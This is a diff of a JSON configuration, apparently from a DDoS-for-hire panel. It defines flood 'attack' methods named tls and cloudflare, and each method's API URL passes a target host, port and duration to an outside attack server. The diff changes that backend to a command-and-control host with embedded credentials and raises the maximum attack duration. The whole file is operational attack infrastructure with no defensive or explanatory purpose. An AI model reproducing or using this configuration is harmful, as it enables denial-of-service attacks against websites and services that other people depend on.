@@ -2,26 +2,26 @@
      "Attacks" : [
 
           {
-               "Name" : "https",
-               "AttackName" : "https",
+               "Name" : "tls",
+               "AttackName" : "tls",
                "Description" : "Standard Home Flood",
-               "API" : "https://phuongthuy.love/api?key=ventox999&host=<<$target>>&time=<<$duration>>&method=https",
+               "API" : "http://www.arthurc2.xyz:5555/api/attack?username=yui&secret=123123&host=<<$target>>&time=<<$time>>&port=<<$port>>&method=.TLS",
                "moderation" : {
                     "LimitMaxTime" : false,
-                    "MaxTime" : 60
+                    "MaxTime" : 120
                },
                "DefaultPort" : "80",
                "AdminMethod" : false,
                "VipMethod" : false
           },         
           {
-               "Name" : "tls",
-               "AttackName" : "tls",
+               "Name" : "cloudflare",
+               "AttackName" : "cloudflare",
                "Description" : "Standard Home Flood",
-               "API" : "https://phuongthuy.love/api?key=ventox999&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=tls",
+               "API" : "http://www.arthurc2.xyz:5555/api/attack?username=yui&secret=123123&host=<<$target>>&time=<<$time>>&port=<<$port>>&method=.CLOUDFLARE",
                "moderation" : {
                     "LimitMaxTime" : false,
-                    "MaxTime" : 60
+                    "MaxTime" : 120
                },
                "DefaultPort" : "80",
                "AdminMethod" : false,
